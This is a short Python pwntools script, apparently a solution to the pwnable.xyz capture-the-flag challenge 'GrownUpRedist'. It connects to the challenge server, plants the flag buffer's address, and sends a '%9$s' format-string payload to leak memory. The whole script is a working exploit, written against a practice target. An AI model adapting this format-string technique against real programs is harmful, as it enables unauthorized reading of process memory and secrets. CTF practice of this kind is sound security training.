from pwn import *
#p = process("./GrownUpRedist")
p = remote("svc.pwnable.xyz", 30004)
elf = ELF("./GrownUpRedist")
flag = 0x601080
libc = elf.libc
p.sendline("y" + "a" * 7 + p32(flag))
payload = "a" * 32
payload += "%9$s"
payload += "a" * (127 - len(payload))

p.sendline(payload)
p.interactive()
